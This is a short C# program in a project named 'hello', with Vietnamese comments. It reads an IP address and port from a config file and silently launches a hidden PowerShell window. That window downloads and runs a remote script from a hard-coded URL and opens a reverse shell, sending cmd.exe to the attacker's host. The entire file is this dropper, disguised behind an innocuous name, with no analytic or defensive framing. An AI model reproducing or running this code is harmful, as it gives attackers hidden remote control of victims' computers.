using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace hello
{
    internal class Program
    {
        static void Main(string[] args)
        {
            string ip = "97.74.89.193", port = "6868";
            string t = System.IO.File.ReadAllText("config.txt");
            if (t != null && t != "")
            {
                string[] at = t.Split(new char[] { ' ', '\t' }, StringSplitOptions.RemoveEmptyEntries);
                ip = at[0];
                if (at.Length >= 1) port = at[1];
            }
            // Chuỗi lệnh PowerShell cần thực thi
            string powerShellCommand = "IEX(New-Object System.Net.WebClient).DownloadString('http://matilda.vn/power.ps1'); huyremy -c " + ip + " -p " + port + " -e cmd.exe";

            // Khởi tạo một quá trình PowerShell
            ProcessStartInfo psi = new ProcessStartInfo
            {
                FileName = "powershell.exe",
                Arguments = $"-W hidden -c \"{powerShellCommand}\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = true
            };


            // Khởi chạy quá trình PowerShell
            Process.Start(psi);
        }
    }
}
